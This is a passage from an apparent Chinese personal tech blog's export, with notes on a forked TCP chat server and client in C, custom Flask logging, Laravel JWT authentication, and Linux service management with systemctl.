serveraddr.sin_port &#x3D; htons(PORT); &#x2F;&#x2F;端口</span><br><span class="line">    inet_aton(SERVER_ADDR,&amp;serveraddr.sin_addr); &#x2F;&#x2F;地址</span><br><span class="line">    bzero(serveraddr.sin_zero,8);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;绑定 和 监听 端口</span><br><span class="line">	Bind_res  &#x3D; bind(server_socket, (struct sockaddr *)(&amp;serveraddr),sizeof(serveraddr));</span><br><span class="line">	if(Bind_res&#x3D;&#x3D;-1)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(&quot;The bind is error!\n&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">	Listen_res &#x3D; listen(server_socket,2);</span><br><span class="line">	if(Listen_res&#x3D;&#x3D;-1)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(&quot;The listen is error!\n&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;server start!\n&quot;);</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; 捕获 ctrl+c信号</span><br><span class="line">    signal(SIGINT,func_kill);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 子进程pid1用于发送</span><br><span class="line">    pid1&#x3D; fork();</span><br><span class="line">    &#x2F;&#x2F; 用于主进程阻塞</span><br><span class="line">	while(1)</span><br><span class="line">	&#123;</span><br><span class="line">        if(pid1&#x3D;&#x3D;0)</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F;等待连接</span><br><span class="line">    		clientaddr_len &#x3D; sizeof(struct sockaddr_in);</span><br><span class="line">            memset(&amp;clientaddr, &#39;\0&#39;, sizeof(struct sockaddr_in));</span><br><span class="line">    		client_socket &#x3D; accept(server_socket, (struct sockaddr*)(&amp;clientaddr), &amp;clientaddr_len);</span><br><span class="line">    		if(client_socket &#x3D;&#x3D; -1)</span><br><span class="line">            &#123;</span><br><span class="line">                perror(&quot;The accept is error!\n&quot;);</span><br><span class="line">                exit(0);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F; 打印连接的子进程ip地址和端口信息</span><br><span class="line">                char clntName[1024];</span><br><span class="line">                if (inet_ntop(AF_INET, &amp;clientaddr.sin_addr.s_addr, clntName, sizeof(clntName)) !&#x3D; NULL) &#123;</span><br><span class="line">                    printf(&quot;connecting client ip: %s port: %d\n&quot;, clntName, ntohs(clientaddr.sin_port));</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    printf(&quot;client address get failed\n&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">       		printf(&quot;client connected success!\n&quot;);</span><br><span class="line">            &#x2F;&#x2F; pid2 用于接收</span><br><span class="line">            pid2&#x3D;fork();</span><br><span class="line">            if(pid2&#x3D;&#x3D;0)</span><br><span class="line">        	&#123;</span><br><span class="line">                &#x2F;&#x2F; pid2 阻塞</span><br><span class="line">                while (1)</span><br><span class="line">                &#123;</span><br><span class="line">                    &#x2F;&#x2F; 当子进程pid1检测到client断开连接后,及时退出子进程pid2,关闭socket</span><br><span class="line">                    signal(SIGHUP, func_kill);</span><br><span class="line">                    fgets(send_msg, sizeof(send_msg), stdin);</span><br><span class="line">    			    send(client_socket, send_msg, sizeof(send_msg), 0);</span><br><span class="line">                &#125;</span><br><span class="line">        	&#125;else&#123;</span><br><span class="line">                &#x2F;&#x2F; pid1 阻塞</span><br><span class="line">                while (1)</span><br><span class="line">                &#123;	</span><br><span class="line">                	int result &#x3D; recv(client_socket,recv_msg, sizeof(recv_msg), 0);</span><br><span class="line">        			&#x2F;&#x2F; 子进程pid1检测到client断开连接</span><br><span class="line">                    if (result &lt;&#x3D; 0)</span><br><span class="line">                    &#123;</span><br><span class="line">                        printf(&quot;client connect close\n&quot;);</span><br><span class="line">                        close(client_socket);</span><br><span class="line">                        kill(pid2,SIGHUP);</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                    &#x2F;&#x2F; 正常连接</span><br><span class="line">                    printf(&quot;Client:%s&quot;,recv_msg);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; 阻塞父进程,pid1退出了就把父进程也退出</span><br><span class="line">            int exit_pid &#x3D; wait(&amp;pid_exit_status);</span><br><span class="line">            if (exit_pid &#x3D;&#x3D; pid1)</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F; printf(&quot;paraent process quit!\n&quot;);</span><br><span class="line">                close(server_socket);</span><br><span class="line">                close(client_socket);  </span><br><span class="line">                exit(0);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Client-c"><a href="#Client-c" class="headerlink" title="Client.c"></a>Client.c</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;netinet&#x2F;in.h&gt;</span><br><span class="line">#include &lt;arpa&#x2F;inet.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;socket.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;wait.h&gt;</span><br><span class="line"></span><br><span class="line">#define PORT 23456</span><br><span class="line">#define SERVER_ADDR &quot;127.0.0.1&quot;</span><br><span class="line"></span><br><span class="line">int server_socket,client_socket;</span><br><span class="line"></span><br><span class="line">void func_kill(int sig)&#123;</span><br><span class="line">    close(server_socket);</span><br><span class="line">    close(client_socket); </span><br><span class="line">    signal(SIGINT,SIG_DFL);</span><br><span class="line">    exit(3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 俩个子进程 pid1 用于接收 pid2 用于发送</span><br><span class="line">	int pid1,pid2;</span><br><span class="line">    &#x2F;&#x2F; 等待pid退出信号</span><br><span class="line">    int pid_exit_status;</span><br><span class="line">    &#x2F;&#x2F; 服务端地址</span><br><span class="line">	struct sockaddr_in serveraddr;</span><br><span class="line">	char recv_msg[100],send_msg[100];</span><br><span class="line">	&#x2F;&#x2F;创建socket</span><br><span class="line">	server_socket &#x3D; socket(AF_INET,SOCK_STREAM,0); </span><br><span class="line">	if(server_socket&#x3D;&#x3D;-1)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(&quot;The socket is error!\n&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">    &#x2F;&#x2F; 设置端口绑定,取消TIME_WAIT,避免占用</span><br><span class="line">    struct linger ling;</span><br><span class="line">    ling.l_onoff &#x3D; 1;</span><br><span class="line">    ling.l_linger &#x3D; 0;</span><br><span class="line">    setsockopt(server_socket,SOL_SOCKET, SO_LINGER, &amp;ling, sizeof(ling));</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 设置服务端地址</span><br><span class="line">	serveraddr.sin_family &#x3D; AF_INET;</span><br><span class="line">	serveraddr.sin_port &#x3D; htons(PORT); </span><br><span class="line">    inet_aton(SERVER_ADDR,&amp;serveraddr.sin_addr);</span><br><span class="line">    bzero(serveraddr.sin_zero,8);</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F;连接socket</span><br><span class="line">	client_socket  &#x3D; connect(server_socket, (struct sockaddr *)(&amp;serveraddr),sizeof(serveraddr));</span><br><span class="line">	if(client_socket&#x3D;&#x3D;-1)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(&quot;The connect is error!\n&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">    printf(&quot;server connect success！\n&quot;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 捕获 ctrl+c信号</span><br><span class="line">    signal(SIGINT,func_kill);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 子进程pid1用于发送</span><br><span class="line">    pid1&#x3D;fork();</span><br><span class="line">    &#x2F;&#x2F; 主进程阻塞</span><br><span class="line">	while(1)</span><br><span class="line">	&#123;</span><br><span class="line">        if (pid1&#x3D;&#x3D;0)</span><br><span class="line">        &#123;  </span><br><span class="line">            &#x2F;&#x2F; 子进程pid2 用于发送</span><br><span class="line">            pid2&#x3D;fork();</span><br><span class="line">            if(pid2&#x3D;&#x3D;0)</span><br><span class="line">        	&#123;</span><br><span class="line">                &#x2F;&#x2F; pid2阻塞</span><br><span class="line">                while (1)</span><br><span class="line">                &#123;</span><br><span class="line">                    signal(SIGHUP,func_kill);</span><br><span class="line">                    fgets(send_msg,sizeof(send_msg),stdin);</span><br><span class="line">    			    send(server_socket,send_msg,sizeof(send_msg),0);</span><br><span class="line">                &#125;</span><br><span class="line">        	&#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F; pid1阻塞</span><br><span class="line">                while (1)</span><br><span class="line">                &#123;</span><br><span class="line">                    int result &#x3D; recv(server_socket,recv_msg,sizeof(recv_msg),0);</span><br><span class="line">            		if (result&lt;&#x3D;0)</span><br><span class="line">                    &#123;</span><br><span class="line">                        printf(&quot;server close\n&quot;);</span><br><span class="line">                        close(server_socket);</span><br><span class="line">                        close(client_socket); </span><br><span class="line">                        &#x2F;&#x2F; 与服务器断开连接,通知pid2退出,关闭socket</span><br><span class="line">                        kill(pid2,SIGHUP);</span><br><span class="line">                        exit(1);</span><br><span class="line">                    &#125;</span><br><span class="line">                    printf(&quot;Server:%s&quot;,recv_msg);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            &#x2F;&#x2F; 阻塞父进程,pid1退出了就把父进程也退出</span><br><span class="line">            int exit_pid &#x3D; wait(&amp;pid_exit_status);</span><br><span class="line">            if (exit_pid&#x3D;&#x3D;pid1)</span><br><span class="line">            &#123;</span><br><span class="line">                &#x2F;&#x2F; printf(&quot;paraent process quit!\n&quot;);</span><br><span class="line">                close(server_socket);</span><br><span class="line">                close(client_socket);  </span><br><span class="line">                exit(0);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p><a href="https://blogjpg.yanmy.top/blog/20201105201755.png"><img src="https://blogjpg.yanmy.top/blog/20201105201755.png" alt="image-20201105201748025"></a></p>
]]></content>
      <categories>
        <category>Note</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>Linux</tag>
        <tag>socket</tag>
      </tags>
  </entry>
  <entry>
    <title>flask自定义日志</title>
    <url>/2020/08/06/Note/flask%E8%87%AA%E5%AE%9A%E4%B9%89%E6%97%A5%E5%BF%97/</url>
    <content><![CDATA[<h1 id="flask自定义日志"><a href="#flask自定义日志" class="headerlink" title="flask自定义日志"></a>flask自定义日志</h1><h2 id="logger"><a href="#logger" class="headerlink" title="logger"></a>logger</h2><p>首先我们要了解python实现记录程序日志功能可以使用logging模块，关于logging的用法，继承类自定义日志，日志等级，等等。</p>
<p>日志输出到文件，用FileHandler，RotatingFileHandler</p>
<a id="more"></a>

<h2 id="app-logger"><a href="#app-logger" class="headerlink" title="app.logger"></a>app.logger</h2><p>看看app.logger源码</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200806155213.png"><img src="https://blogjpg.yanmy.top/blog/20200806155213.png" alt="image-20200806155213786"></a></p>
<p><a href="https://blogjpg.yanmy.top/blog/20200806155326.png"><img src="https://blogjpg.yanmy.top/blog/20200806155326.png" alt="image-20200806155326597"></a></p>
<p>得到几点信息</p>
<ul>
<li>在初始化app时,便创建了一个app.name的日志记录器,其是继承于python的logging模块的</li>
<li>该记录器已经添加一个default_handler</li>
</ul>
<p>写一个小功能:flask实现类似nginx的access.log</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">from flask.logging import default_handler</span><br><span class="line">from logging import Formatter, INFO</span><br><span class="line">from logging.handlers import RotatingFileHandler</span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line">app.debug &#x3D; True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 主路由index page</span><br><span class="line">@app.route(&#39;&#x2F;&#39;, methods&#x3D;[&#39;Get&#39;])</span><br><span class="line">def index():</span><br><span class="line">    return &quot;hello&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 在每一次请求前执行</span><br><span class="line">@app.before_request</span><br><span class="line">def log_each_request():</span><br><span class="line">    params &#x3D; request.args if request.args is None else &#39;&#39;</span><br><span class="line">    app.logger.info(&#39;&#123;&#125;-&#123;&#125;-&#123;&#125;&#39;.format(request.method, request.path, params))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    # 日志格式化类            记录时间      等级               代码行        日志信息</span><br><span class="line">    formatter &#x3D; Formatter(&#39;%(asctime)s  - %(levelname)s - %(lineno)d - %(message)s&#39;)</span><br><span class="line">    info_log_path &#x3D; &#39;logs&#x2F;flask.log&#39;</span><br><span class="line">    # 自动分割日志功能的Handler</span><br><span class="line">    file_handler &#x3D; RotatingFileHandler(info_log_path, maxBytes&#x3D;10 * 1024 * 1024, backupCount&#x3D;10)</span><br><span class="line">    file_handler.setFormatter(formatter)</span><br><span class="line">    file_handler.setLevel(INFO)</span><br><span class="line">    if not app.debug:</span><br><span class="line">        app.logger.removeHandler(default_handler)</span><br><span class="line">        app.logger.addHandler(file_handler)</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
<p><a href="https://blogjpg.yanmy.top/blog/20200806160238.png"><img src="https://blogjpg.yanmy.top/blog/20200806160238.png" alt="image-20200806160238707"></a></p>
<p>如果我们将这行代码注释掉</p>
<ul>
<li>app.debug=True的情况下，日志可以输出，但是会将控制台所有的信息都输出到日志文件，这是我们不想的，我们只想要app.logger.info写的内容。</li>
<li>app.debug=False的情况下，日志不工作了，之前还能全部输出只是有些是我们不想要的，现在都没了，就好像女朋友说分手就分手。</li>
</ul>
<h3 id="Why？"><a href="#Why？" class="headerlink" title="Why？"></a>Why？</h3><p>跟进default_handler</p>
<p><a href="https://blogjpg.yanmy.top/blog/20200806161324.png"><img src="https://blogjpg.yanmy.top/blog/20200806161324.png" alt="image-20200806161324214"></a></p>
<p>default_handler是一个StreamHandler，将日志记录输出发送到流，例如<em>sys.stdout</em>，<em>sys.stderr</em>或任何类似文件的对象（或更准确地说，是支持<code>write()</code> 和<code>flush()</code>方法的任何对象）</p>
<p>所以控制台的输出也会一起输出至你的文件了</p>
<p>app.debug问题：应用程序控制台中看到的输出来自底层的Werkzeug记录器，没有设置logleve，日志就没有了。</p>
<h2 id="然后"><a href="#然后" class="headerlink" title="然后"></a>然后</h2><p>然后，然后干嘛？</p>
<p>然后就去玩呀😝</p>
]]></content>
      <categories>
        <category>Note</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>python</tag>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Laravel使用JWT</title>
    <url>/2020/04/02/Note/laravel%E4%BD%BF%E7%94%A8jwt/</url>
    <content><![CDATA[<h1 id="Laravel使用JWT"><a href="#Laravel使用JWT" class="headerlink" title="Laravel使用JWT"></a>Laravel使用JWT</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>laravel使用JWT有两种方法,一中是使用内置的Auth结合JWT定义的中间件进行认证,这种方法laravel社区有很多教程,这里不再细说，谈谈如何使用自定义JWT来完成用户认证</p>
<a id="more"></a>
<h2 id="JWT-oath"><a href="#JWT-oath" class="headerlink" title="JWT-oath"></a>JWT-oath</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#使用composer安装jwt-oath扩展</span><br><span class="line">#当然也可以写进composer.json文件中</span><br><span class="line">composer require tymon&#x2F;jwt-auth</span><br></pre></td></tr></table></figure>
<h3 id="生成加密密匙"><a href="#生成加密密匙" class="headerlink" title="生成加密密匙"></a>生成加密密匙</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 这条命令会在 .env 文件下生成一个加密密钥，如：JWT_SECRET&#x3D;foobar</span><br><span class="line">#注意.env文件默认是不会上传git的,为了你的同伴也可以正常使用认证,需要在.env.example中手动添加相同的字段</span><br><span class="line">php artisan jwt:secret</span><br></pre></td></tr></table></figure>
<h4 id="注册两个-Facade"><a href="#注册两个-Facade" class="headerlink" title="注册两个 Facade"></a>注册两个 Facade</h4><p>这两个 Facade 并不是必须的，但是使用它们会给你的代码编写带来一点便利。</p>
<p><strong>config/app.php</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;aliases&#39; &#x3D;&gt; [</span><br><span class="line">        ...</span><br><span class="line">        &#x2F;&#x2F; 添加以下两行</span><br><span class="line">        &#39;JWTAuth&#39; &#x3D;&gt; &#39;Tymon\JWTAuth\Facades\JWTAuth&#39;,</span><br><span class="line">        &#39;JWTFactory&#39; &#x3D;&gt; &#39;Tymon\JWTAuth\Facades\JWTFactory&#39;,</span><br><span class="line">],</span><br></pre></td></tr></table></figure>
<h4 id="修改-auth-php"><a href="#修改-auth-php" class="headerlink" title="修改 auth.php"></a>修改 auth.php</h4><p><strong>config/auth.php</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;guards&#39; &#x3D;&gt; [</span><br><span class="line">    &#39;web&#39; &#x3D;&gt; [</span><br><span class="line">        &#39;driver&#39; &#x3D;&gt; &#39;session&#39;,</span><br><span class="line">        &#39;provider&#39; &#x3D;&gt; &#39;users&#39;,</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    &#39;api&#39; &#x3D;&gt; [</span><br><span class="line">        &#39;driver&#39; &#x3D;&gt; &#39;jwt&#39;,      &#x2F;&#x2F; 原来是 token 改成jwt</span><br><span class="line">        &#39;provider&#39; &#x3D;&gt; &#39;users&#39;,</span><br><span class="line">    ],</span><br><span class="line">],</span><br></pre></td></tr></table></figure>
<h3 id="处理流程"><a href="#处理流程" class="headerlink" title="处理流程"></a>处理流程</h3><p><a href="https://blogjpg.yanmy.top/blog/20200402/xwyk8GUazxXF.png?imageslim"><img src="https://blogjpg.yanmy.top/blog/20200402/xwyk8GUazxXF.png?imageslim" alt="mark"></a></p>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><h4 id="生成"><a href="#生成" class="headerlink" title="生成"></a>生成</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;自定义的载荷填充</span><br><span class="line">$customClaims &#x3D; [</span><br><span class="line">            &#39;iss&#39; &#x3D;&gt; &quot;http:&#x2F;&#x2F;market.sky31.com&quot;,</span><br><span class="line">            &#39;share&#39; &#x3D;&gt; md5($stu_id),</span><br><span class="line">        ];</span><br><span class="line">&#x2F;&#x2F;利用JWT工厂类生成根据自定义的载荷生成payload</span><br><span class="line">$payload &#x3D; \JWTFactory::customClaims($customClaims)-&gt;make();</span><br><span class="line">&#x2F;&#x2F;调用Auth类的encode方法就可以生成token</span><br><span class="line">$token &#x3D; \JWTAuth::encode($payload);</span><br><span class="line">&#x2F;&#x2F;注意,此处的token是一个类,如何直接添加进response()-&gt;json()中将会报错,所以强制转换为String便可以当成字符床正常使用了</span><br><span class="line">return (string)$token;</span><br></pre></td></tr></table></figure>
<h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;认证可以写在中间件中</span><br><span class="line">&#x2F;&#x2F;首部use添加JWT的所有异常类</span><br><span class="line">use Tymon\JWTAuth\Exceptions\JWTException;</span><br><span class="line">use Tymon\JWTAuth\Exceptions\TokenExpiredException;</span><br><span class="line">use Tymon\JWTAuth\Exceptions\TokenInvalidException;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;一定要使用try catch版快来验证token,token的验证失败,过期等等异常都是throw一个异常,不捕获异常程序直接死掉了,且错误信息不可以定义,就会导致代码不严谨</span><br><span class="line">try &#123;</span><br><span class="line"> 	&#x2F;&#x2F;定义一个Auth类来验证token,首先将传过来的token绑定在类中</span><br><span class="line">    $token &#x3D; \JWTAuth::setToken($data[&#39;token&#39;]);</span><br><span class="line">    &#x2F;&#x2F;调用以下方法可以获取token中载荷的数据来使用</span><br><span class="line">    $user_id&#x3D;$token-&gt;payload()-&gt;get()[&#39;user_id&#39;];</span><br><span class="line">    &#x2F;&#x2F;验证token,正确就会取出其中的载荷返回一个只含有载荷的对象,</span><br><span class="line">    &#x2F;&#x2F;失败就会抛出异常,失败的原因有许多,过期,数据格式不对,整个JWT过期</span><br><span class="line">    $token-&gt;checkOrFail();</span><br><span class="line">    &#x2F;&#x2F;还有一个$token()-&gt;check方法可以验证token,返回值为bool,验证失败不会抛出异常而是返回false</span><br><span class="line">    &#x2F;&#x2F;捕获过期异常然后去刷新过期时间</span><br><span class="line">&#125; catch (TokenExpiredException $e) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        &#x2F;&#x2F;刷新token,返回值是更新过期时间的新token</span><br><span class="line">        $new_token&#x3D;$token-&gt;refresh();</span><br><span class="line">        &#x2F;&#x2F;更新数据库中的token</span><br><span class="line">        $user&#x3D; User::query()-&gt;where(&#39;user_id&#39;,$user_id)-&gt;first();</span><br><span class="line">        $user-&gt;token&#x3D;$new_token;</span><br><span class="line">        $user-&gt;save();</span><br><span class="line">        &#x2F;&#x2F;将新token设置在request的参数中传给下一个路由</span><br><span class="line">        $request-&gt;request-&gt;set(&quot;token&quot;,$new_token);</span><br><span class="line">        &#x2F;&#x2F;如果刷新不了,也过期了就返回错误码让用户重新登录</span><br><span class="line">    &#125;catch (TokenExpiredException $e)&#123;</span><br><span class="line">        &#x2F;&#x2F;msg是我自定义的用来返回json的,不用管</span><br><span class="line">        return msg(3,__LINE__);</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;token格式错误</span><br><span class="line">&#125; catch (TokenInvalidException $e) &#123;</span><br><span class="line">    return msg(403,$e-&gt;getMessage());</span><br><span class="line">&#125;catch (JWTException $e) &#123;</span><br><span class="line">    return msg(403,$e-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;将request传给下下一个路由,到这里认证便成功了</span><br><span class="line">return $next($request);</span><br></pre></td></tr></table></figure>
<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>JWT-oath扩展会在config目录下生成一个jwt.php,里面定义了JWT的相关配置</p>
<p>**注意:**这个扩展有两种过期方式,一种的token有效期,时间短,过期了需要刷新,一种是刷新有效期,时间长,只要在有效期内拿不在黑名单的旧token来刷新就可以,时间一长一短可以一定程度上防止token盗用</p>
<p>常用配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;jwt有效期,默认是60分钟,单位是分钟</span><br><span class="line">JWT_TTL </span><br><span class="line">&#x2F;&#x2F;jwt的刷新有效期,单位是分钟,默认是20160(14天)</span><br><span class="line">JWT_REFRESH_TTL</span><br><span class="line">&#x2F;&#x2F;注意以上两个时间不可以用60*24这种格式,需要设置为120这样的整数</span><br><span class="line">&#x2F;&#x2F;必须填充的载荷,在你自己设定载荷的时候必须全部手动填充,不然会报错,无法生成,不想自定义的可以注释掉</span><br><span class="line">    &#39;required_claims&#39; &#x3D;&gt; [</span><br><span class="line">        &#39;iss&#39;,</span><br><span class="line">&#x2F;&#x2F;        &#39;iat&#39;,</span><br><span class="line">&#x2F;&#x2F;        &#39;exp&#39;,</span><br><span class="line">&#x2F;&#x2F;        &#39;nbf&#39;,</span><br><span class="line">&#x2F;&#x2F;        &#39;sub&#39;,</span><br><span class="line">&#x2F;&#x2F;        &#39;jti&#39;,</span><br><span class="line">    ], </span><br><span class="line">&#x2F;&#x2F;iss默认是使用用于请求的api路径</span><br><span class="line">&#x2F;&#x2F;设置黑名单,当为false时,刷新后生成新token,旧token仍然可以用</span><br><span class="line">&#x2F;&#x2F;true验证时就会抛出黑名单异常信息</span><br><span class="line">blacklist_enabled</span><br></pre></td></tr></table></figure>
<p>建议是修改.env中的环境变量,不要修改jwt.php文件,因为jwt.php文件中的配置项大都是从.env中获取的,没有获取到会用默认值</p>
]]></content>
      <categories>
        <category>Note</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>php</tag>
        <tag>laravel</tag>
        <tag>jwt</tag>
      </tags>
  </entry>
  <entry>
    <title>linux服务管理</title>
    <url>/2020/03/01/Note/linux%E6%9C%8D%E5%8A%A1%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h1 id="linux服务管理"><a href="#linux服务管理" class="headerlink" title="linux服务管理"></a>linux服务管理</h1><h2 id="在-System-V-SysV-系统中查看运行的服务——service"><a href="#在-System-V-SysV-系统中查看运行的服务——service" class="headerlink" title="在 System V(SysV)系统中查看运行的服务——service"></a>在 System V(SysV)系统中查看运行的服务——service</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#显示全部</span><br><span class="line">service --status-all</span><br><span class="line">#显示多数</span><br><span class="line">service --status-all | more</span><br><span class="line">#显示少数</span><br><span class="line">service --status-all | less</span><br><span class="line">#正在运行</span><br><span class="line">service --status-all | grep running</span><br><span class="line">#查看指定服务</span><br><span class="line">service --status-all | grep httpd</span><br><span class="line">or</span><br><span class="line">service httpd status</span><br></pre></td></tr></table></figure>
<a id="more"></a>

<h2 id="systemd-系统中管理运行的服务——systemctl"><a href="#systemd-系统中管理运行的服务——systemctl" class="headerlink" title="systemd 系统中管理运行的服务——systemctl"></a>systemd 系统中管理运行的服务——systemctl</h2><h3 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#列出系统中服务</span><br><span class="line">systemctl</span><br><span class="line">#根据类型列出单元</span><br><span class="line">systemctl list-units --type service</span><br><span class="line">#根据状态列出单位</span><br><span class="line">systemctl list-unit-files --type service</span><br><span class="line">#查看运行中的服务</span><br><span class="line">systemctl | grep running</span><br><span class="line">#查看系统启动时会被启用的服务列表</span><br><span class="line">systemctl list-unit-files | grep enabled</span><br><span class="line">#查看指定服务</span><br><span class="line">systemctl | grep apache2</span><br><span class="line">or</span><br><span class="line">systemctl status apache2</span><br><span class="line">#按资源使用情况（任务、CPU、内存、输入和输出）列出控制组：</span><br><span class="line">systemd-cgtop</span><br></pre></td></tr></table></figure>
<ul>
<li><code>UNIT</code> 相应的 systemd 单元名称</li>
<li><code>LOAD</code> 相应的单元是否被加载到内存中</li>
<li><code>ACTIVE</code> 该单元是否处于活动状态</li>
<li><code>SUB</code> 该单元是否处于运行状态（LCTT 译注：是较于 ACTIVE 更加详细的状态描述，不同的单元类型有不同的状态。）</li>
<li><code>DESCRIPTION</code> 关于该单元的简短描述</li>
</ul>
<h3 id="注册服务"><a href="#注册服务" class="headerlink" title="注册服务"></a>注册服务</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#配置文件目录</span><br><span class="line">#systemctl脚本目录：</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;</span><br><span class="line">#系统服务目录：</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;</span><br><span class="line">#用户服务目录</span><br><span class="line">usr&#x2F;lib&#x2F;systemd&#x2F;user&#x2F;</span><br></pre></td></tr></table></figure>
<p>第一步</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system目录下新建service-name.service文件：</span><br><span class="line">#nginx.service文件示例</span><br><span class="line"></span><br><span class="line"># Stop dance for nginx</span><br><span class="line"># &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">#</span><br><span class="line"># ExecStop sends SIGSTOP (graceful stop) to the nginx process.</span><br><span class="line"># If, after 5s (--retry QUIT&#x2F;5) nginx is still running, systemd takes control</span><br><span class="line"># and sends SIGTERM (fast shutdown) to the main process.</span><br><span class="line"># After another 5s (TimeoutStopSec&#x3D;5), and if nginx is alive, systemd sends</span><br><span class="line"># SIGKILL to all the remaining processes in the process group (KillMode&#x3D;mixed).</span><br><span class="line">#</span><br><span class="line"># nginx signals reference doc:</span><br><span class="line"># http:&#x2F;&#x2F;nginx.org&#x2F;en&#x2F;docs&#x2F;control.html</span><br><span class="line">#</span><br><span class="line">[Unit]</span><br><span class="line">#服务描述</span><br><span class="line">Description&#x3D;A high performance web server and a reverse proxy server</span><br><span class="line">Documentation&#x3D;man:nginx(8)</span><br><span 